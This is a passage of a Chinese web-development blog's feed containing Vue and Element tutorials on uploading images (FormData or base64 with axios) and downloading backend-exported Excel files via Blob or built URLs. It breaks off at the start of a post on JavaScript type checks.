class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;multipart/form-data&#x27;</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      formData.append(<span class="string">&#x27;file&#x27;</span>, req.file)</span></span><br><span class="line"><span class="javascript">      formData.append(<span class="string">&#x27;filename&#x27;</span>, req.filename)</span></span><br><span class="line"><span class="javascript">      uploadFile(<span class="string">&#x27;url&#x27;</span>, formData, config)</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">beforeUpload</span>(<span class="params">file</span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> isImg = <span class="built_in">this</span>.fileType.includes(file.type)</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> isLimit = file.size / <span class="number">1024</span> / <span class="number">1024</span> &lt; <span class="number">2</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (!isImg) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.$message.error(<span class="string">&#x27;上传图片只能是“png”、“jpg”、“jpeg”格式!&#x27;</span>)</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (!isLimit) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.$message.error(<span class="string">&#x27;上传图片大小不能超过 2MB!&#x27;</span>)</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> isImg &amp;&amp; isLimit</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="方案2：把选择的文件-base64-后上传"><a href="#方案2：把选择的文件-base64-后上传" class="headerlink" title="方案2：把选择的文件 base64 后上传"></a>方案2：把选择的文件 base64 后上传</h2><p>有一些小图片可能会采取前端 base64 上传。这里我们使用 H5 FileReader 对象，用 <code>readAsDataURL</code> 将文件转 base64 </p><p><strong>注意：<code>readAsDataURL 操作是异步的</code></strong></p><p>代码如下：（这个例子是手动点击上传再上传）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;el-upload</span><br><span class="line">      ref=<span class="string">&quot;upload&quot;</span></span><br><span class="line">      action</span><br><span class="line">      list-type=<span class="string">&quot;picture-card&quot;</span></span><br><span class="line">      :file-list=<span class="string">&quot;imgList&quot;</span></span><br><span class="line">      :accept=<span class="string">&quot;imgTool.type.join(&#x27;,&#x27;)&quot;</span></span><br><span class="line">      :on-change=<span class="string">&quot;handleChange&quot;</span></span><br><span class="line">      :on-remove=<span class="string">&quot;hadnleRemove&quot;</span></span><br><span class="line">      :auto-upload=<span class="string">&quot;false&quot;</span></span><br><span class="line">    &gt;</span><br><span class="line">      &lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;el-icon-upload&quot;</span> /&gt;</span><br><span class="line">      &lt;div slot=<span class="string">&quot;tip&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;el-upload__tip&quot;</span> style=<span class="string">&quot;color:red&quot;</span>&gt;</span><br><span class="line">        提示：仅允许导入“png”、“jpg”、“jpeg”格式文件，且不超过2M！</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/el-upload&gt;</span><br><span class="line">    &lt;el-button type=<span class="string">&quot;success&quot;</span> size=<span class="string">&quot;mini&quot;</span> @click=<span class="string">&quot;submitUpload&quot;</span>&gt;上传到服务器&lt;/el-button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">import</span> &#123; uploadFile &#125; <span class="keyword">from</span> <span class="string">&#x27;../api/index&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      imgTool: &#123;</span><br><span class="line">        type: [<span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/jpg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>],</span><br><span class="line">        size: <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">      &#125;,</span><br><span class="line">      imgList: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="title">submitUpload</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.imgList)</span><br><span class="line">      <span class="keyword">const</span> base64Pro = <span class="built_in">this</span>.imgList.map(<span class="function"><span class="params">file</span> =&gt;</span> <span class="built_in">this</span>.fileReader(file.raw))</span><br><span class="line">      <span class="keyword">const</span> base64List = <span class="keyword">await</span> <span class="built_in">Promise</span>.all(base64Pro)</span><br><span class="line">      <span class="keyword">const</span> config = &#123;</span><br><span class="line">        headers: &#123;</span><br><span class="line">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      base64List.forEach(<span class="function">(<span class="params">item, i</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = &#123;</span><br><span class="line">          base64: <span class="built_in">decodeURIComponent</span>(item),</span><br><span class="line">          name: <span class="built_in">this</span>.imgList[i].name</span><br><span class="line">        &#125;</span><br><span class="line">        uploadFile(<span class="string">&#x27;url&#x27;</span>, data, config)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">handleChange</span>(<span class="params">file, filList</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> isImg = <span class="built_in">this</span>.imgTool.type.includes(file.raw.type)</span><br><span class="line">      <span class="keyword">const</span> isLimit = file.size &lt; <span class="built_in">this</span>.imgTool.size</span><br><span class="line">      <span class="keyword">if</span> (!isImg) &#123;</span><br><span class="line">        <span class="built_in">this</span>.$message.error(<span class="string">&#x27;上传图片只能是“png”、“jpg”、“jpeg”格式!&#x27;</span>)</span><br><span class="line">        <span class="built_in">this</span>.imgList = filList.filter(<span class="function"><span class="params">v</span> =&gt;</span> v.uid !== file.uid)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!isLimit) &#123;</span><br><span class="line">        <span class="built_in">this</span>.$message.error(<span class="string">&#x27;上传图片大小不能超过 2MB!&#x27;</span>)</span><br><span class="line">        <span class="built_in">this</span>.imgList = filList.filter(<span class="function"><span class="params">v</span> =&gt;</span> v.uid !== file.uid)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">this</span>.imgList.push(file)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">hadnleRemove</span>(<span class="params">_, fileList</span>)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.imgList = fileList</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">fileReader</span>(<span class="params">file</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> reader = <span class="keyword">new</span> FileReader()</span><br><span class="line">        reader.readAsDataURL(file)</span><br><span class="line">        reader.onload = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">          resolve(e.target.result)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上述案例是本地文件转 base64，如需在线图片转 base64，可以参考 <a href="https://juejin.cn/post/6844903639086006279#heading-6">用Vue来实现图片上传多种方式</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;vue 中使用 Element 的 upload 组件上传 Excel，大致可以分两种情况&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;使用 &lt;code&gt;action&lt;/code&gt; 上传到服务器&lt;/p&gt;
&lt;p&gt;如下不讨论使用 action 上传服务器，如需了解可以参考：&lt;a href=&quot;https://blog.csdn.net/qq_38689395/article/details/118419678&quot;&gt;Vue 中使用 Upload 组件上传 Excel&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;使用 &lt;code&gt;axios&lt;/code&gt; 上传到服务器&lt;/p&gt;
&lt;p&gt;这里主要阐述如下两种情况&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 FormData 上传&lt;/li&gt;
&lt;li&gt;使用 base64 上传&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="Element" scheme="http://llmysnow.top/tags/Element/"/>
    
    <category term="form-data" scheme="http://llmysnow.top/tags/form-data/"/>
    
    <category term="base64" scheme="http://llmysnow.top/tags/base64/"/>
    
  </entry>
  
  <entry>
    <title>Vue 处理文件的下载（后端Excel导出）</title>
    <link href="http://llmysnow.top/posts/14d3abe4/"/>
    <id>http://llmysnow.top/posts/14d3abe4/</id>
    <published>2021-08-31T02:16:08.891Z</published>
    <updated>2021-08-31T02:16:08.891Z</updated>
    
    <content type="html"><![CDATA[<p>大概有两种方法（通常对应的是需要不需要携带 token），原理都是通过 <code>a</code> 标签下载</p><ol><li>通过 Ajax 请求，拿到 <code>response</code> ，转换为 blob 格式（主要是为了处理 type），为其生成下载链接，下载即可</li><li>直接拼接 URL，拼出来对应请求链接，直接访问即可（不需要二次 token 认证）</li></ol><a id="more"></a><h2 id="后端文件流"><a href="#后端文件流" class="headerlink" title="后端文件流"></a>后端文件流</h2><ul><li>首先点击导出 Excel ，这里调用接口成功</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E5%AF%BC%E5%87%BAExcel%E6%8E%A5%E5%8F%A3%E6%88%90%E5%8A%9F.jpg"></p><ul><li>接下来看一下后台返回的数据是什么样，是文件流格式（<code>OutputStream</code>）</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/%E5%90%8E%E7%AB%AF%E8%BF%94%E5%9B%9E%E7%9A%84%E6%95%B0%E6%8D%AE%E6%B5%81.jpg"></p><p>在处理之前，说几个要注意的点！！！</p><ol><li><p><strong>注意：后端在这里一般会设置如下几个请求头</strong></p><p>后端还可能开启 jwt token 验证，如果开启请移步第 2 点请求拦截设置 headers</p><p><strong>注意： 由于跨域浏览器处于安全考虑不让自定义响应头通过 JS 获取</strong> （详见： <a href="https://blog.csdn.net/PGguoqi/article/details/106824957">JS 无法获取响应 header 的 Content-Disposition 字段</a> ），也就是说 <code>Content-Disposition</code> 前端在 Network 里是能看到的，但是无法通过 JS 获取到，这里后端需要将其暴露出去</p><p>跨域情况默认只暴露：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code> 六个属性</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置返回类型为excel</span></span><br><span class="line">response.setContentType(<span class="string">&quot;application/vnd.ms-excel; charset=UTF-8&quot;</span>);  </span><br><span class="line"><span class="comment">// 设置返回文件名为filename.xls </span></span><br><span class="line">response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;filename.xls&quot;</span>); </span><br><span class="line"><span class="comment">// 请求或响应消息不能走缓存</span></span><br><span class="line">response.setHeader(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line"><span class="comment">// 将Content-Disposition暴露出去，这样就可以用过JS获取到了</span></span><br><span class="line">response.setHeader(<span class="string">&quot;Access-Control-Expose-Headers&quot;</span>, <span class="string">&quot;Content-Disposition&quot;</span>);</span><br></pre></td></tr></table></figure><ol start="2"><li><p><strong>注意：前端在 Axios 请求和响应拦截的时候，需要对其进行处理</strong></p><p>请求拦截一般我们都是会设置 headers，这里只是简单处理一下，实际会根据不同情况设置 headers</p><p>响应拦截一般我们都是把 <code>response.data</code> 进行返回，但是这里我们需要把整个 <code>response</code> 返回（因为文件名在 headers 里面）</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; getToken &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/auth&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; AUTHOR_KEY &#125; <span class="keyword">from</span> <span class="string">&#x27;@/global&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> service = axios.create(&#123;</span><br><span class="line">  baseURL: process.env.NODE_ENV === <span class="string">&#x27;development&#x27;</span> ? <span class="string">&#x27;&#x27;</span> : <span class="string">&#x27;http://127.0.0.1:9999&#x27;</span></span><br><span class="line">  withCredentials: <span class="literal">true</span>,</span><br><span class="line">  timeout: <span class="number">5000</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求拦截器</span></span><br><span class="line">service.interceptors.request.use(</span><br><span class="line">  config =&gt; &#123;</span><br><span class="line">    config.headers[AUTHOR_KEY] = getToken()</span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">  &#125;,</span><br><span class="line">  error =&gt; <span class="built_in">console</span>.log(error)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 响应拦截器</span></span><br><span class="line">service.interceptors.response.use(</span><br><span class="line">  response =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (response.config.responseType === <span class="string">&#x27;blob&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> response</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response.data</span><br><span class="line">  &#125;,</span><br><span class="line">  error =&gt; <span class="built_in">console</span>.log(error)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> service</span><br></pre></td></tr></table></figure><p>接下来要处理这个文件流，大概有两种方法（通常对应的是需要不需要携带 token），原理都是通过 <code>a</code> 标签下载</p><ol><li>通过 Ajax 请求，拿到 <code>response</code> ，转换为 blob 格式（主要是为了处理 type），为其生成下载链接，下载即可</li><li>拼接 URL，拼出来对应请求链接，直接访问即可</li></ol><h2 id="通过-Blob-下载"><a href="#通过-Blob-下载" class="headerlink" title="通过 Blob 下载"></a>通过 Blob 下载</h2><p>Blob 通常用于存储大文件，典型的 Blob 内容是一张图片或一个音频</p><ol><li>默认情况下 axios 不会处理二进制数据，即请求可以正常被浏览器接收，但 axios 不会去处理。<strong>需要在请求的时候设置 <code>responseType: &#39;blob&#39;</code> 才可以</strong></li><li>拿到文件流之后，需要生成一个 URL 才可以下载，可以<strong>通过<code>URL.createObjectURL()</code>方法生成一个链接</strong></li><li>a 标签添加文件名<br>正常情况下，通过 <code>window.location = url</code> 就可以下载文件。浏览器判断这个链接是一个资源而不是页面的时候，就会下载文件。但是通过文件流生成的 url 对应的资源是没有文件名的，需要添加文件名。这时候可以用到 download 属性指定下载的文件名</li></ol><p>由于有浏览器问题可能会出现 <code>content-disposition</code> 匹配不到，最好做一下判断看 <code>content-disposition</code> 和 <code>Content-Disposition</code> 哪个能取到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mimeMap = &#123;</span><br><span class="line">  xlsx: <span class="string">&#x27;application/vnd.ms-excel&#x27;</span>,</span><br><span class="line">  zip: <span class="string">&#x27;application/zip&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> toExcel = <span class="function"><span class="params">params</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> request(&#123;</span><br><span class="line">    method: <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">    url: <span class="string">&#x27;/dayReportToExcel/toExcel&#x27;</span>,</span><br><span class="line">    responseType: <span class="string">&#x27;blob&#x27;</span>,</span><br><span class="line">    params</span><br><span class="line">  &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> resolveBlob(res, mimeMap.xlsx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveBlob</span>(<span class="params">res, mimeType</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 创建a标签，并处理二级制数据</span></span><br><span class="line">  <span class="keyword">const</span> aLink = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> blob = <span class="keyword">new</span> Blob([res.data], &#123; <span class="attr">type</span>: mimeType &#125;)</span><br><span class="line">  <span class="comment">// 生成下载链接</span></span><br><span class="line">  <span class="keyword">const</span> URL = <span class="built_in">window</span>.URL || <span class="built_in">window</span>.webkitURL</span><br><span class="line">  aLink.href = URL.createObjectURL(blob)</span><br><span class="line">  <span class="comment">// 设置下载文件名称</span></span><br><span class="line">  <span class="keyword">let</span> fileName = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> (res.headers[<span class="string">&#x27;content-disposition&#x27;</span>]) fileName = res.headers[<span class="string">&#x27;content-disposition&#x27;</span>]</span><br><span class="line">  <span class="keyword">if</span> (res.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>]) fileName = res.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>]</span><br><span class="line">  aLink.setAttribute(<span class="string">&#x27;download&#x27;</span>, fileName)</span><br><span class="line">  <span class="comment">// 下载</span></span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(aLink)</span><br><span class="line">  aLink.click()</span><br><span class="line">  <span class="comment">// 释放URL对象</span></span><br><span class="line">  <span class="built_in">window</span>.URL.revokeObjectURL(aLink.href)</span><br><span class="line">  <span class="built_in">document</span>.body.removeChild(aLink)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：一般情况下文件名都是需要匹配的，后端传过来的可能是这样的，首选需要 <code>decodeURI</code> 解码一下，再用正则把文件名匹配出来（替换设置下载文件名那里即可）</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/company-img/Excel%E6%96%87%E4%BB%B6%E5%90%8D.jpg"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">resolveBlob</span>(<span class="params">res, mimeType</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> aLink = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> blob = <span class="keyword">new</span> Blob([res.data], &#123; <span class="attr">type</span>: mimeType &#125;)</span><br><span class="line">  <span class="keyword">const</span> pat = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;filename=([^;]+\\.[^\\.;]+)&#x27;</span>)</span><br><span class="line">  <span class="keyword">let</span> contentDisposition</span><br><span class="line">  <span class="keyword">if</span> (res.headers[<span class="string">&#x27;content-disposition&#x27;</span>]) contentDisposition = res.headers[<span class="string">&#x27;content-disposition&#x27;</span>]</span><br><span class="line">  <span class="keyword">if</span> (res.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>]) contentDisposition = res.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>]</span><br><span class="line">  <span class="keyword">const</span> result = pat.exec(<span class="built_in">decodeURI</span>(contentDisposition))</span><br><span class="line">  <span class="keyword">let</span> fileName = result &amp;&amp; result[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">const</span> URL = <span class="built_in">window</span>.URL || <span class="built_in">window</span>.webkitURL</span><br><span class="line">  aLink.href = URL.createObjectURL(blob)</span><br><span class="line">  <span class="comment">// 如果Content-Disposition没有暴露，给文件一个默认名字</span></span><br><span class="line">  <span class="keyword">if</span> (fileName == <span class="literal">null</span>) fileName = <span class="string">&#x27;日报表&#x27;</span></span><br><span class="line">  aLink.setAttribute(<span class="string">&#x27;download&#x27;</span>, fileName)</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(aLink)</span><br><span class="line">  aLink.click()</span><br><span class="line">  <span class="comment">// 释放URL对象</span></span><br><span class="line">  <span class="built_in">window</span>.URL.revokeObjectURL(aLink.href)</span><br><span class="line">  <span class="built_in">document</span>.body.removeChild(aLink)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="拼接-URL-下载"><a href="#拼接-URL-下载" class="headerlink" title="拼接 URL 下载"></a>拼接 URL 下载</h2><p>如果可以直接通过 URL 下载文件，则可以不需要发送 Ajax 请求（前提是没有 token、headers 验证），直接下载</p><ul><li>可以使用 <code>a</code> 标签进行下载</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qs <span class="keyword">from</span> <span class="string">&#x27;qs&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadExcel</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="built_in">window</span>.location.origin + <span class="string">&#x27;/dayReportToExcel/toExcel?&#x27;</span> + qs.stringify(params)</span><br><span class="line">  <span class="keyword">const</span> aLink = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  aLink.setAttribute(<span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  aLink.setAttribute(<span class="string">&#x27;target&#x27;</span>, <span class="string">&#x27;_blank&#x27;</span>)</span><br><span class="line">  aLink.href = url</span><br><span class="line">  aLink.click()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以使用 <code>window.open(url, &#39;_blank&#39;)</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qs <span class="keyword">from</span> <span class="string">&#x27;qs&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadExcel</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="built_in">window</span>.location.origin + <span class="string">&#x27;/dayReportToExcel/toExcel?&#x27;</span> + qs.stringify(params)</span><br><span class="line">  <span class="built_in">window</span>.open(url, <span class="string">&#x27;_blank&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;大概有两种方法（通常对应的是需要不需要携带 token），原理都是通过 &lt;code&gt;a&lt;/code&gt; 标签下载&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 Ajax 请求，拿到 &lt;code&gt;response&lt;/code&gt; ，转换为 blob 格式（主要是为了处理 type），为其生成下载链接，下载即可&lt;/li&gt;
&lt;li&gt;直接拼接 URL，拼出来对应请求链接，直接访问即可（不需要二次 token 认证）&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Vue" scheme="http://llmysnow.top/categories/Vue/"/>
    
    
    <category term="Vue" scheme="http://llmysnow.top/tags/Vue/"/>
    
    <category term="Excel" scheme="http://llmysnow.top/tags/Excel/"/>
    
    <category term="跨域处理" scheme="http://llmysnow.top/tags/%E8%B7%A8%E5%9F%9F%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>JS 检测数据类型的四种方式</title>
    <link href="http://llmysnow.top/posts/5d2789f/"/>
    <id>http://llmysnow.top/posts/5d2789f/</id>
    <published>2021-08-31T02:16:08.890Z</published>
    <updated>2021-08-31T02:16:08.890Z</updated>
    
    <content type="html"><![CDATA[<p>JavaScript 有八种数据类型：</p><p>基本数据类型：Boolean、Number、String、null、undefined、Symbol(ES6新增)、BigInt（ES2020引入）</p><p>引用数据类型：Object</p><blockquote><p>Symbol：表示独一无二的值</p><p>BigInt：用来解决 JavaScript 中数字只能到 53 个二进制位，大于这个范围的整数，无法精确表示</p></blockquote><a id="more"></a><h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><blockquote><p>底层原理：typeof 是按照”值”在计算机存储的”二进制”值来检测的，凡是以 000 开始的都认为是对象</p></blockquote><p>返回结果是一个字符串（全小写字母），可返回的类型有：</p><ul><li>“number”</li><li>“string”</li><li>“boolean”</li><li>“undefined”</li><li>“object”</li><li>“function”</li><li>“symbol”</li><li>“bigint”</li></ul><p><strong>注意：</strong> <code>typeof null</code> 返回的是 “object”，<code>typeof 变量（不存在）</code> 返回的是 “undefined”</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>;  <span class="comment">// &quot;object&quot;</span></span><br><span class="line"><span 